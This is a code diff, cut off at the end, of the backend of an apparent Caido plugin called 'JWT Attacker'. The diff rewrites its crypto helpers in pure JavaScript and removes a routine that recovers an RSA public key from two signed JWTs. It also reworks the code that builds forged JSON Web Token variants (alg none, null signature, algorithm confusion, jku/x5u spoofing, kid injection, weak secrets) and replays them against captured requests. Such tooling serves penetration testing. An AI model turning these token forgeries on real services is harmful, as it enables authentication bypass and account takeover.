@@ -2,7 +2,7 @@
 import { RequestSpec } from "caido:utils";
 
 // packages/backend/src/crypto/jwt.ts
-import { createHmac, createSign } from "node:crypto";
+import { createHmac, createHash } from "crypto";
 function b64urlEncode(data) {
   const bytes = typeof data === "string" ? Buffer.from(data, "utf8") : Buffer.from(data);
   return bytes.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
@@ -43,55 +43,107 @@ function signHMAC(header, payload, secret, alg) {
   const sig = b64urlEncode(hmac.digest());
   return `${signingInput}.${sig}`;
 }
-function signRSA(header, payload, privateKeyPem, alg) {
-  const hashMap = {
-    RS256: "SHA256",
-    RS384: "SHA384",
-    RS512: "SHA512",
-    PS256: "SHA256",
-    PS384: "SHA384",
-    PS512: "SHA512"
-  };
-  const padding = alg.startsWith("PS") ? "RSA-PSS" : void 0;
-  const signingInput = encodeUnsigned(header, payload);
-  const signer = createSign(hashMap[alg]);
-  signer.update(signingInput);
-  const sig = padding ? signer.sign({ key: privateKeyPem, padding: 6, saltLength: -2 }) : signer.sign(privateKeyPem);
-  return `${signingInput}.${b64urlEncode(sig)}`;
+var DIGEST_INFO = {
+  sha256: "3031300d060960864801650304020105000420",
+  sha384: "3041300d060960864801650304020205000430",
+  sha512: "3051300d060960864801650304020305000440"
+};
+function derReadLen(buf, off) {
+  const b = buf[off];
+  if (b < 128) return { len: b, next: off + 1 };
+  const nb = b & 127;
+  let len = 0;
+  for (let i = 0; i < nb; i++) len = len << 8 | buf[off + 1 + i];
+  return { len, next: off + 1 + nb };
 }
-function signECDSA(header, payload, privateKeyPem, alg) {
-  const hashMap = { ES256: "SHA256", ES384: "SHA384", ES512: "SHA512" };
-  const signingInput = encodeUnsigned(header, payload);
-  const signer = createSign(hashMap[alg]);
-  signer.update(signingInput);
-  const derSig = signer.sign(privateKeyPem);
-  const rawSig = derToRawECDSA(derSig, alg);
-  return `${signingInput}.${b64urlEncode(rawSig)}`;
+function derSkip(buf, off) {
+  off++;
+  const { len, next } = derReadLen(buf, off);
+  return next + len;
 }
-function derToRawECDSA(der, alg) {
-  const componentLen = { ES256: 32, ES384: 48, ES512: 66 }[alg];
-  let offset = 2;
-  if (der[1] === 129) offset = 3;
-  else if (der[1] === 130) offset = 4;
-  offset++;
-  const rLen = der[offset++];
-  let rStart = offset;
-  if (der[rStart] === 0) {
-    rStart++;
+function derReadBigInt(buf, off) {
+  if (buf[off] !== 2) throw new Error(`Expected INTEGER at ${off}`);
+  off++;
+  const { len, next } = derReadLen(buf, off);
+  const hex = buf.slice(next, next + len).toString("hex");
+  return { value: hex ? BigInt("0x" + hex) : 0n, next: next + len };
+}
+function parsePKCS8RSAKey(pem) {
+  const b64 = pem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
+  const der = Buffer.from(b64, "base64");
+  let off = 0;
+  if (der[off] !== 48) throw new Error("Not a PKCS8 key");
+  off++;
+  const { next: outerBody } = derReadLen(der, off);
+  off = outerBody;
+  off = derSkip(der, off);
+  off = derSkip(der, off);
+  if (der[off] !== 4) throw new Error("Expected OCTET STRING");
+  off++;
+  const { next: octBody } = derReadLen(der, off);
+  off = octBody;
+  if (der[off] !== 48) throw new Error("Expected RSAPrivateKey SEQUENCE");
+  off++;
+  const { next: rsaBody } = derReadLen(der, off);
+  off = rsaBody;
+  off = derSkip(der, off);
+  const { value: n, next: afterN } = derReadBigInt(der, off);
+  off = afterN;
+  off = derSkip(der, off);
+  const { value: d } = derReadBigInt(der, off);
+  return { n, d };
+}
+function modpow(base, exp, mod) {
+  if (mod === 1n) return 0n;
+  let result = 1n;
+  base = base % mod;
+  while (exp > 0n) {
+    if (exp & 1n) result = result * base % mod;
+    exp >>= 1n;
+    base = base * base % mod;
   }
-  const r = der.slice(rStart, offset + rLen);
-  offset += rLen;
-  offset++;
-  const sLen = der[offset++];
-  let sStart = offset;
-  if (der[sStart] === 0) {
-    sStart++;
-  }
-  const s = der.slice(sStart, offset + sLen);
-  const result = Buffer.alloc(componentLen * 2, 0);
-  r.copy(result, componentLen - r.length);
-  s.copy(result, componentLen * 2 - s.length);
   return result;
+}
+function emsaPKCS1(hash, hashAlg, keyLen) {
+  const di = Buffer.from(DIGEST_INFO[hashAlg], "hex");
+  const psLen = keyLen - 3 - di.length - hash.length;
+  if (psLen < 8) throw new Error("Key too short for this hash algorithm");
+  const em = Buffer.alloc(keyLen);
+  let off = 0;
+  em[off++] = 0;
+  em[off++] = 1;
+  em.fill(255, off, off + psLen);
+  off += psLen;
+  em[off++] = 0;
+  di.copy(em, off);
+  off += di.length;
+  hash.copy(em, off);
+  return em;
+}
+function signRSA(header, payload, privateKeyPem, alg) {
+  if (alg.startsWith("PS")) {
+    throw new Error("RSA-PSS signing not supported in this runtime");
+  }
+  const hashMap = {
+    RS256: "sha256",
+    RS384: "sha384",
+    RS512: "sha512"
+  };
+  const hashAlg = hashMap[alg];
+  if (!hashAlg) throw new Error(`Unsupported RSA algorithm: ${alg}`);
+  const signingInput = encodeUnsigned(header, payload);
+  const { n, d } = parsePKCS8RSAKey(privateKeyPem);
+  const keyLen = Math.ceil(n.toString(2).length / 8);
+  const hash = createHash(hashAlg).update(signingInput).digest();
+  const em = emsaPKCS1(hash, hashAlg, keyLen);
+  const m = BigInt("0x" + em.toString("hex"));
+  const s = modpow(m, d, n);
+  const sHex = s.toString(16).padStart(keyLen * 2, "0");
+  const sBuf = Buffer.from(sHex, "hex");
+  return `${signingInput}.${b64urlEncode(sBuf)}`;
+}
+function signECDSA(_header, _payload, _privateKeyPem, _alg) {
+  throw new Error("ECDSA signing not supported in this runtime (requires elliptic curve math)");
 }
 function verifyHMAC(token, secret, alg) {
   const parts = token.split(".");
@@ -103,19 +155,11 @@ function verifyHMAC(token, secret, alg) {
   const expected = b64urlEncode(hmac.digest());
   return expected === parts[2];
 }
-function getAlgorithmFamily(alg) {
-  if (alg.toLowerCase() === "none") return "none";
-  if (alg.startsWith("HS")) return "HS";
-  if (alg.startsWith("RS")) return "RS";
-  if (alg.startsWith("ES")) return "ES";
-  if (alg.startsWith("PS")) return "PS";
-  return "unknown";
-}
 
 // packages/backend/src/util.ts
-import { randomBytes } from "node:crypto";
+import { randomBytes } from "crypto";
 function nanoid(size = 12) {
-  return randomBytes(size).toString("base64url").slice(0, size);
+  return randomBytes(size).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "").slice(0, size);
 }
 function parseCookies(cookieHeader) {
   const cookies = {};
@@ -178,36 +222,129 @@ function buildNullSigAttacks(parsed) {
 }
 
 // packages/backend/src/crypto/rsa.ts
-import { generateKeyPairSync, createPublicKey } from "node:crypto";
-function generateRSAKeyPair(bits = 2048) {
-  const { publicKey, privateKey } = generateKeyPairSync("rsa", {
-    modulusLength: bits,
-    publicKeyEncoding: { type: "spki", format: "pem" },
-    privateKeyEncoding: { type: "pkcs8", format: "pem" }
-  });
-  const jwk = publicKey2jwk(publicKey);
-  return { publicKeyPem: publicKey, privateKeyPem: privateKey, publicJwk: jwk };
+function generateRSAKeyPair(_bits = 2048) {
+  throw new Error("RSA key generation is not available in this runtime");
 }
-function publicKey2jwk(keyPem) {
-  const key = createPublicKey(keyPem);
-  const raw = key.export({ format: "jwk" });
-  return raw;
+function encodeLength(len) {
+  if (len < 128) return Buffer.from([len]);
+  if (len < 256) return Buffer.from([129, len]);
+  return Buffer.from([130, len >> 8 & 255, len & 255]);
+}
+function encodeSequence(data) {
+  return Buffer.concat([Buffer.from([48]), encodeLength(data.length), data]);
+}
+function encodeInteger(data) {
+  return Buffer.concat([Buffer.from([2]), encodeLength(data.length), data]);
+}
+function encodeBitString(data) {
+  const inner = Buffer.concat([Buffer.from([0]), data]);
+  return Buffer.concat([Buffer.from([3]), encodeLength(inner.length), inner]);
+}
+function derReadLength(buf, offset) {
+  const first = buf[offset];
+  if (first < 128) return { len: first, next: offset + 1 };
+  const nb = first & 127;
+  let len = 0;
+  for (let i = 0; i < nb; i++) len = len << 8 | buf[offset + 1 + i];
+  return { len, next: offset + 1 + nb };
+}
+function derSkip2(buf, offset) {
+  offset++;
+  const { len, next } = derReadLength(buf, offset);
+  return next + len;
 }
 function x509CertToPublicKeyPem(certPem) {
-  try {
-    const key = createPublicKey(certPem);
-    return key.export({ type: "spki", format: "pem" });
-  } catch {
-    throw new Error("Failed to extract public key from certificate");
-  }
+  const b64 = certPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
+  const der = Buffer.from(b64, "base64");
+  let offset = 0;
+  if (der[offset] !== 48) throw new Error("Not a certificate SEQUENCE");
+  offset++;
+  const { next: tbsStart } = derReadLength(der, offset);
+  offset = tbsStart;
+  if (der[offset] !== 48) throw new Error("TBSCertificate not a SEQUENCE");
+  offset++;
+  const { next: tbsBodyStart } = derReadLength(der, offset);
+  offset = tbsBodyStart;
+  if (der[offset] === 160) offset = derSkip2(der, offset);
+  offset = derSkip2(der, offset);
+  offset = derSkip2(der, offset);
+  offset = derSkip2(der, offset);
+  offset = derSkip2(der, offset);
+  offset = derSkip2(der, offset);
+  if (der[offset] !== 48) throw new Error("SPKI not found in certificate");
+  const spkiStart = offset;
+  offset++;
+  const { len: spkiLen, next: spkiBodyStart } = derReadLength(der, offset);
+  const spki = der.slice(spkiStart, spkiBodyStart + spkiLen);
+  const pem64 = spki.toString("base64");
+  const lines = pem64.match(/.{1,64}/g).join("\n");
+  return `-----BEGIN PUBLIC KEY-----
+${lines}
+-----END PUBLIC KEY-----
+`;
 }
 function publicKeyPemToRawBytes(keyPem) {
-  const key = createPublicKey(keyPem);
-  return key.export({ type: "spki", format: "der" });
+  const b64 = keyPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
+  return Buffer.from(b64, "base64");
 }
 function jwkToPublicKeyPem(jwk) {
-  const key = createPublicKey({ key: jwk, format: "jwk" });
-  return key.export({ type: "spki", format: "pem" });
+  if (jwk.kty === "RSA") {
+    return rsaJwkToSpkiPem(jwk);
+  }
+  if (jwk.kty === "EC") {
+    return ecJwkToSpkiPem(jwk);
+  }
+  throw new Error(`Unsupported JWK kty: ${jwk.kty}`);
+}
+function rsaJwkToSpkiPem(jwk) {
+  if (!jwk.n || !jwk.e) throw new Error("RSA JWK missing n or e");
+  const nBuf = b64urlDecode(jwk.n);
+  const eBuf = b64urlDecode(jwk.e);
+  const nDer = nBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), nBuf]) : nBuf;
+  const eDer = eBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), eBuf]) : eBuf;
+  const rsaKeySeq = encodeSequence(Buffer.concat([encodeInteger(nDer), encodeInteger(eDer)]));
+  const algId = encodeSequence(Buffer.concat([
+    Buffer.from("06092a864886f70d010101", "hex"),
+    // OID rsaEncryption
+    Buffer.from("0500", "hex")
+    // NULL
+  ]));
+  const spki = encodeSequence(Buffer.concat([algId, encodeBitString(rsaKeySeq)]));
+  const b64 = spki.toString("base64");
+  const lines = b64.match(/.{1,64}/g).join("\n");
+  return `-----BEGIN PUBLIC KEY-----
+${lines}
+-----END PUBLIC KEY-----
+`;
+}
+function ecJwkToSpkiPem(jwk) {
+  if (!jwk.x || !jwk.y || !jwk.crv) throw new Error("EC JWK missing x, y, or crv");
+  const curveOids = {
+    "P-256": "06082a8648ce3d030107",
+    "P-384": "06052b81040022",
+    "P-521": "06052b81040023"
+  };
+  const pointLens = { "P-256": 32, "P-384": 48, "P-521": 66 };
+  const oidHex = curveOids[jwk.crv];
+  if (!oidHex) throw new Error(`Unsupported EC curve: ${jwk.crv}`);
+  const xBuf = b64urlDecode(jwk.x);
+  const yBuf = b64urlDecode(jwk.y);
+  const coordLen = pointLens[jwk.crv];
+  const xPadded = Buffer.alloc(coordLen);
+  const yPadded = Buffer.alloc(coordLen);
+  xBuf.copy(xPadded, coordLen - xBuf.length);
+  yBuf.copy(yPadded, coordLen - yBuf.length);
+  const point = Buffer.concat([Buffer.from([4]), xPadded, yPadded]);
+  const ecPublicKeyOid = Buffer.from("06072a8648ce3d0201", "hex");
+  const curveOid = Buffer.from(oidHex, "hex");
+  const algId = encodeSequence(Buffer.concat([ecPublicKeyOid, curveOid]));
+  const spki = encodeSequence(Buffer.concat([algId, encodeBitString(point)]));
+  const b64 = spki.toString("base64");
+  const lines = b64.match(/.{1,64}/g).join("\n");
+  return `-----BEGIN PUBLIC KEY-----
+${lines}
+-----END PUBLIC KEY-----
+`;
 }
 function jwksToPublicKeys(jwks) {
   const pems = [];
@@ -221,50 +358,22 @@ function jwksToPublicKeys(jwks) {
 }
 function buildJWKSDocument(publicJwk, kid = "jwt-attacker-key") {
   return {
-    keys: [
-      {
-        ...publicJwk,
-        use: "sig",
-        kid,
-        alg: "RS256"
-      }
-    ]
+    keys: [{ ...publicJwk, use: "sig", kid, alg: "RS256" }]
   };
 }
 
 // packages/backend/src/crypto/ecdsa.ts
-import { generateKeyPairSync as generateKeyPairSync2, createPublicKey as createPublicKey2 } from "node:crypto";
-var ALG_TO_CURVE = {
-  ES256: "prime256v1",
-  ES384: "secp384r1",
-  ES512: "secp521r1"
-};
-function generateECKeyPair(alg) {
-  const curve = ALG_TO_CURVE[alg];
-  const { publicKey, privateKey } = generateKeyPairSync2("ec", {
-    namedCurve: curve,
-    publicKeyEncoding: { type: "spki", format: "pem" },
-    privateKeyEncoding: { type: "pkcs8", format: "pem" }
-  });
-  const key = createPublicKey2(publicKey);
-  const jwk = key.export({ format: "jwk" });
-  return { publicKeyPem: publicKey, privateKeyPem: privateKey, publicJwk: jwk, curve };
+function generateECKeyPair(_alg) {
+  throw new Error("EC key generation is not available in this runtime");
 }
 function ecPublicKeyPemToRawBytes(keyPem) {
-  const key = createPublicKey2(keyPem);
-  return key.export({ type: "spki", format: "der" });
+  return publicKeyPemToRawBytes(keyPem);
 }
 function buildECJWKS(publicJwk, alg, kid = "jwt-attacker-ec-key") {
   return {
     keys: [{ ...publicJwk, use: "sig", kid, alg }]
   };
 }
-
-// packages/backend/src/crypto/certFetch.ts
-import * as tls from "node:tls";
-import * as https from "node:https";
-import * as http from "node:http";
-import { URL } from "node:url";
 
 // packages/backend/src/types.ts
 var COMMON_JWKS_PATHS = [
@@ -287,53 +396,22 @@ var COMMON_JWKS_PATHS = [
 ];
 
 // packages/backend/src/crypto/certFetch.ts
-async function fetchTLSCertPem(host, port = 443) {
-  return new Promise((resolve, reject) => {
-    const socket = tls.connect(
-      { host, port, rejectUnauthorized: false, servername: host },
-      () => {
-        const cert = socket.getPeerX509Certificate();
-        socket.destroy();
-        if (!cert) {
-          reject(new Error("No certificate returned"));
-          return;
-        }
-        const b64 = cert.raw.toString("base64");
-        const lines = b64.match(/.{1,64}/g).join("\n");
-        resolve(`-----BEGIN CERTIFICATE-----
-${lines}
------END CERTIFICATE-----
-`);
-      }
-    );
-    socket.on("error", reject);
-    socket.setTimeout(8e3, () => {
-      socket.destroy();
-      reject(new Error("TLS connection timeout"));
-    });
-  });
+async function fetchTLSCertPem(_host, _port = 443) {
+  throw new Error("TLS certificate fetching not available in this runtime");
 }
 async function fetchURL(url, timeoutMs = 8e3) {
-  return new Promise((resolve, reject) => {
-    const parsed = new URL(url);
-    const lib = parsed.protocol === "https:" ? https : http;
-    const req = lib.get(
-      url,
-      { rejectUnauthorized: false, headers: { "User-Agent": "Mozilla/5.0" } },
-      (res) => {
-        let data = "";
-        res.on("data", (chunk) => {
-          data += chunk.toString();
-        });
-        res.on("end", () => resolve(data));
-      }
-    );
-    req.on("error", reject);
-    req.setTimeout(timeoutMs, () => {
-      req.destroy();
-      reject(new Error(`Timeout fetching ${url}`));
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), timeoutMs);
+  try {
+    const res = await fetch(url, {
+      signal: controller.signal,
+      headers: { "User-Agent": "Mozilla/5.0" }
     });
-  });
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    return await res.text();
+  } finally {
+    clearTimeout(timer);
+  }
 }
 async function fetchJWKS(url) {
   try {
@@ -356,14 +434,22 @@ async function fetchOpenIDConfig(issuerUrl) {
   }
 }
 async function discoverJWKS(baseUrl, extraPaths = []) {
-  const parsed = new URL(baseUrl);
-  const origin = `${parsed.protocol}//${parsed.host}`;
+  let origin;
+  try {
+    const parsed = new URL(baseUrl);
+    origin = `${parsed.protocol}//${parsed.host}`;
+  } catch {
+    return [];
+  }
   const pathsToTry = [...COMMON_JWKS_PATHS, ...extraPaths];
   const results = [];
-  const jwksUri = await fetchOpenIDConfig(origin);
-  if (jwksUri) {
-    const jwks = await fetchJWKS(jwksUri);
-    if (jwks) results.push({ url: jwksUri, keys: jwks.keys });
+  try {
+    const jwksUri = await fetchOpenIDConfig(origin);
+    if (jwksUri) {
+      const jwks = await fetchJWKS(jwksUri);
+      if (jwks) results.push({ url: jwksUri, keys: jwks.keys });
+    }
+  } catch {
   }
   for (let i = 0; i < pathsToTry.length; i += 5) {
     const batch = pathsToTry.slice(i, i + 5);
@@ -1075,230 +1161,13 @@ async function buildWeakSecretAttacks(parsed, config, originalToken) {
   return results;
 }
 
-// packages/backend/src/crypto/keyRecovery.ts
-import { createHash } from "node:crypto";
-import { createPublicKey as createPublicKey3 } from "node:crypto";
-var DIGEST_INFO = {
-  sha256: Buffer.from("3031300d060960864801650304020105000420", "hex"),
-  sha384: Buffer.from("3041300d060960864801650304020205000430", "hex"),
-  sha512: Buffer.from("3051300d060960864801650304020305000440", "hex")
-};
-var ALG_TO_HASH = {
-  RS256: "sha256",
-  RS384: "sha384",
-  RS512: "sha512"
-};
-function gcd(a, b) {
-  while (b !== 0n) {
-    [a, b] = [b, a % b];
-  }
-  return a < 0n ? -a : a;
-}
-function buildEM(hash, hashAlg, keyLen) {
-  const di = DIGEST_INFO[hashAlg];
-  if (!di) throw new Error(`No DigestInfo for ${hashAlg}`);
-  const psLen = keyLen - 3 - di.length - hash.length;
-  if (psLen < 8) throw new Error("Key too short for this hash algorithm");
-  const em = Buffer.alloc(keyLen);
-  let offset = 0;
-  em[offset++] = 0;
-  em[offset++] = 1;
-  em.fill(255, offset, offset + psLen);
-  offset += psLen;
-  em[offset++] = 0;
-  di.copy(em, offset);
-  offset += di.length;
-  hash.copy(em, offset);
-  return BigInt("0x" + em.toString("hex"));
-}
-function bufferToBigint(buf) {
-  if (buf.length === 0) return 0n;
-  return BigInt("0x" + buf.toString("hex"));
-}
-function bigintToPublicKeyPem(n, e = 65537n) {
-  const nHex = n.toString(16);
-  const eHex = e.toString(16);
-  const nBuf = Buffer.from(nHex.length % 2 ? "0" + nHex : nHex, "hex");
-  const eBuf = Buffer.from(eHex.length % 2 ? "0" + eHex : eHex, "hex");
-  const nDer = nBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), nBuf]) : nBuf;
-  const eDer = eBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), eBuf]) : eBuf;
-  const jwk = {
-    kty: "RSA",
-    n: nBuf.toString("base64url"),
-    e: eBuf.toString("base64url")
-  };
-  try {
-    const key = createPublicKey3({ key: jwk, format: "jwk" });
-    return key.export({ type: "spki", format: "pem" });
-  } catch {
-    const inner = encodeSequence(
-      Buffer.concat([encodeInteger(nDer), encodeInteger(eDer)])
-    );
-    const spki = encodeSequence(
-      Buffer.concat([
-        encodeSequence(
-          Buffer.concat([
-            // OID rsaEncryption
-            Buffer.from("06092a864886f70d010101", "hex"),
-            Buffer.from("0500", "hex")
-            // NULL
-          ])
-        ),
-        encodeBitString(inner)
-      ])
-    );
-    const b64 = spki.toString("base64");
-    const lines = b64.match(/.{1,64}/g).join("\n");
-    return `-----BEGIN PUBLIC KEY-----
-${lines}
------END PUBLIC KEY-----
-`;
-  }
-}
-function encodeLength(len) {
-  if (len < 128) return Buffer.from([len]);
-  if (len < 256) return Buffer.from([129, len]);
-  return Buffer.from([130, len >> 8 & 255, len & 255]);
-}
-function encodeSequence(data) {
-  return Buffer.concat([Buffer.from([48]), encodeLength(data.length), data]);
-}
-function encodeInteger(data) {
-  return Buffer.concat([Buffer.from([2]), encodeLength(data.length), data]);
-}
-function encodeBitString(data) {
-  const inner = Buffer.concat([Buffer.from([0]), data]);
-  return Buffer.concat([Buffer.from([3]), encodeLength(inner.length), inner]);
-}
-var SMALL_PRIMES = [
-  2n,
-  3n,
-  5n,
-  7n,
-  11n,
-  13n,
-  17n,
-  19n,
-  23n,
-  29n,
-  31n,
-  37n,
-  41n,
-  43n,
-  47n,
-  53n,
-  59n,
-  61n,
-  67n,
-  71n,
-  73n,
-  79n,
-  83n,
-  89n,
-  97n,
-  101n,
-  103n,
-  107n,
-  109n,
-  113n,
-  127n,
-  131n,
-  137n,
-  139n,
-  149n,
-  151n,
-  157n,
-  163n,
-  167n,
-  173n,
-  179n,
-  181n,
-  191n,
-  193n,
-  197n,
-  199n,
-  211n,
-  223n,
-  227n,
-  229n,
-  233n,
-  239n,
-  241n
-];
-function stripSmallFactors(n) {
-  for (const p of SMALL_PRIMES) {
-    while (n % p === 0n) n /= p;
-  }
-  return n;
-}
-async function recoverRSAPublicKey(jwt1, jwt2, onProgress) {
-  const alg = jwt1.header.alg;
-  if (!ALG_TO_HASH[alg]) throw new Error(`Unsupported algorithm: ${alg}`);
-  const hashAlg = ALG_TO_HASH[alg];
-  const sig1 = b64urlDecode(jwt1.signatureB64);
-  const sig2 = b64urlDecode(jwt2.signatureB64);
-  const keyLen = sig1.length;
-  onProgress?.(`Signature length: ${keyLen * 8} bits, computing hashes\u2026`);
-  const msg1 = `${jwt1.headerB64}.${jwt1.payloadB64}`;
-  const msg2 = `${jwt2.headerB64}.${jwt2.payloadB64}`;
-  const h1 = createHash(hashAlg).update(msg1).digest();
-  const h2 = createHash(hashAlg).update(msg2).digest();
-  const em1 = buildEM(h1, hashAlg, keyLen);
-  const em2 = buildEM(h2, hashAlg, keyLen);
-  const s1 = bufferToBigint(sig1);
-  const s2 = bufferToBigint(sig2);
-  onProgress?.(`Computing s1^e (this may take up to a minute)\u2026`);
-  const e = 65537n;
-  const s1e = s1 ** e;
-  onProgress?.(`Computing s2^e\u2026`);
-  const s2e = s2 ** e;
-  onProgress?.(`Computing residuals and GCD\u2026`);
-  const r1 = s1e - em1;
-  const r2 = s2e - em2;
-  let nCandidate = gcd(r1 < 0n ? -r1 : r1, r2 < 0n ? -r2 : r2);
-  onProgress?.(`Raw GCD computed (${nCandidate.toString(16).length / 2} bytes), removing small factors\u2026`);
-  nCandidate = stripSmallFactors(nCandidate);
-  const bitLen = nCandidate.toString(2).length;
-  if (bitLen < 512) throw new Error(`Recovered modulus too small (${bitLen} bits) \u2014 likely an incorrect pair`);
-  onProgress?.(`Recovered ${bitLen}-bit modulus. Building public key\u2026`);
-  const pem = bigintToPublicKeyPem(nCandidate);
-  return { publicKeyPem: pem, modulusBits: bitLen };
-}
-async function recoverPublicKeyFromJWTs(jwts, onProgress) {
-  const rsJwts = jwts.filter((j) => j.header.alg && ALG_TO_HASH[j.header.alg]);
-  if (rsJwts.length < 2) {
-    throw new Error("Need at least 2 RS-family JWTs with the same algorithm");
-  }
-  const byAlg = {};
-  for (const jwt of rsJwts) {
-    const alg = jwt.header.alg;
-    (byAlg[alg] ??= []).push(jwt);
-  }
-  const results = [];
-  for (const [alg, group] of Object.entries(byAlg)) {
-    if (group.length < 2) continue;
-    onProgress?.(`Attempting key recovery for ${alg} with ${group.length} JWTs\u2026`);
-    for (let i = 0; i < Math.min(group.length - 1, 3); i++) {
-      for (let j = i + 1; j < Math.min(group.length, 4); j++) {
-        try {
-          const result = await recoverRSAPublicKey(group[i], group[j], onProgress);
-          results.push(result);
-          break;
-        } catch (err) {
-          onProgress?.(`Pair ${i},${j} failed: ${err.message}`);
-        }
-      }
-      if (results.find((r) => r.modulusBits > 0)) break;
-    }
-  }
-  return results;
-}
-
 // packages/backend/src/index.ts
 async function attackJwt(sdk, requestId, config) {
   const sessionId = Math.random().toString(36).slice(2);
   const errors = [];
+  sdk.console.log(`[JWT Attacker] attackJwt called: requestId=${requestId}`);
   (async () => {
+    sdk.api.send("jwt-attack-started", { sessionId, requestId, total: 0 });
     const reqResp = await sdk.requests.get(requestId);
     if (!reqResp) {
       sdk.api.send("jwt-attack-complete", { sessionId, errors: ["Request not found"] });
@@ -1308,7 +1177,7 @@ async function attackJwt(sdk, requestId, config) {
     const spec = request.toSpec();
     const locations = findJWTsInSpec(spec);
     if (locations.length === 0) {
-      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["No JWT found in request"] });
+      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["No JWT found in request (checked Authorization header, cookies, and JSON body)"] });
       return;
     }
     const loc = locations[0];
@@ -1321,60 +1190,58 @@ async function attackJwt(sdk, requestId, config) {
       return;
     }
     const recoveredKeys = [];
-    const algFamily = getAlgorithmFamily(parsed.header.alg);
-    if (config.enabledAttacks.algConfusion && (algFamily === "RS" || algFamily === "PS" || algFamily === "ES")) {
-      try {
-        const historyJWTs = await collectHistoryJWTs(sdk, request.getHost(), 100);
-        if (historyJWTs.length >= 2) {
-          sdk.api.send("jwt-key-recovery-progress", {
-            sessionId,
-            message: `Found ${historyJWTs.length} JWTs in history \u2014 attempting key recovery\u2026`
-          });
-          const keyResults = await recoverPublicKeyFromJWTs(
-            historyJWTs,
-            (msg) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: msg })
-          );
-          for (const r of keyResults) {
-            recoveredKeys.push(r.publicKeyPem);
-          }
-          sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: recoveredKeys });
-        }
-      } catch {
-      }
-    }
+    const cfg = normalizeConfig(config);
+    sdk.console.log(
+      `[JWT Attacker] enabled attacks: ${Object.entries(cfg.enabledAttacks).filter(([, v]) => v).map(([k]) => k).join(", ") || "(none)"}`
+    );
     const attacks = [];
     const merge = (arr) => attacks.push(...arr);
-    if (config.enabledAttacks.none) merge(buildNoneAttacks(parsed));
-    if (config.enabledAttacks.nullSig) merge(buildNullSigAttacks(parsed));
-    if (config.enabledAttacks.embeddedJwk) merge(buildEmbeddedJWKAttacks(parsed));
-    if (config.enabledAttacks.kidInject) merge(buildKIDInjectionAttacks(parsed));
-    if (config.enabledAttacks.claimTamper) merge(buildClaimTamperAttacks(parsed));
-    if (config.enabledAttacks.weakSecret) {
-      merge(await buildWeakSecretAttacks(parsed, config, originalJWT));
+    const tryMerge = async (name, fn) => {
+      try {
+        merge(await fn());
+      } catch (e) {
+        errors.push(`[${name}] ${e.message}`);
+        sdk.console.log(`[JWT Attacker] ${name} builder failed: ${e.message}`);
+      }
+    };
+    if (cfg.enabledAttacks.none) await tryMerge("none", () => buildNoneAttacks(parsed));
+    if (cfg.enabledAttacks.nullSig) await tryMerge("nullSig", () => buildNullSigAttacks(parsed));
+    if (cfg.enabledAttacks.embeddedJwk) await tryMerge("embeddedJwk", () => buildEmbeddedJWKAttacks(parsed));
+    if (cfg.enabledAttacks.kidInject) await tryMerge("kidInject", () => buildKIDInjectionAttacks(parsed));
+    if (cfg.enabledAttacks.claimTamper) await tryMerge("claimTamper", () => buildClaimTamperAttacks(parsed));
+    if (cfg.enabledAttacks.weakSecret) {
+      await tryMerge("weakSecret", () => buildWeakSecretAttacks(parsed, cfg, originalJWT));
     }
-    if (config.enabledAttacks.jkuSpoof || config.enabledAttacks.x5uSpoof) {
-      const { attacks: spoofAttacks, jwksContent, jwksKey } = buildJKUSpoofAttacks(parsed, config);
-      merge(spoofAttacks);
-      if (jwksContent && jwksKey) {
-        sdk.api.send("jwks-payload", { sessionId, jwksJson: jwksContent, privateKeyPem: jwksKey });
+    if (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) {
+      try {
+        const { attacks: spoofAttacks, jwksContent, jwksKey } = buildJKUSpoofAttacks(parsed, cfg);
+        merge(spoofAttacks);
+        if (jwksContent && jwksKey) {
+          sdk.api.send("jwks-payload", { sessionId, jwksJson: jwksContent, privateKeyPem: jwksKey });
+        }
+      } catch (e) {
+        errors.push(`[jkuSpoof] ${e.message}`);
       }
     }
-    if (config.enabledAttacks.algConfusion) {
-      const confusionAttacks = await buildAlgConfusionAttacks(
+    if (cfg.enabledAttacks.algConfusion) {
+      await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
         parsed,
         request.getHost(),
         request.getPort(),
         request.getTls(),
-        config,
+        cfg,
         recoveredKeys
-      );
-      merge(confusionAttacks);
+      ));
     }
-    sdk.api.send("jwt-attack-started", {
-      sessionId,
-      requestId,
-      total: attacks.length
-    });
+    sdk.console.log(`[JWT Attacker] built ${attacks.length} attack variant(s)`);
+    if (attacks.length === 0) {
+      sdk.api.send("jwt-attack-complete", {
+        sessionId,
+        errors: errors.length ? errors : ["No attack variants were generated \u2014 check that at least one attack is enabled in Configuration."]
+      });
+      return;
+    }
+    sdk.api.send("jwt-attack-started", { sessionId, requestId, total: attacks.length });
     for (const attack of attacks) {
       try {
         const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
@@ -1408,6 +1275,35 @@ async function getJWTsInRequest(sdk, requestId) {
   const reqResp = await sdk.requests.get(requestId);
   if (!reqResp) return [];
   return findJWTsInSpec(reqResp.request.toSpec());
+}
+var ALL_ATTACKS = [
+  "none",
+  "nullSig",
+  "algConfusion",
+  "embeddedJwk",
+  "jkuSpoof",
+  "x5uSpoof",
+  "kidInject",
+  "claimTamper",
+  "weakSecret"
+];
+function normalizeConfig(raw) {
+  const c = raw && typeof raw === "object" ? raw : {};
+  const rawEnabled = c.enabledAttacks && typeof c.enabledAttacks === "object" ? c.enabledAttacks : {};
+  const hasAnyFlag = ALL_ATTACKS.some((k) => typeof rawEnabled[k] === "boolean");
+  const enabledAttacks = {};
+  for (const k of ALL_ATTACKS) {
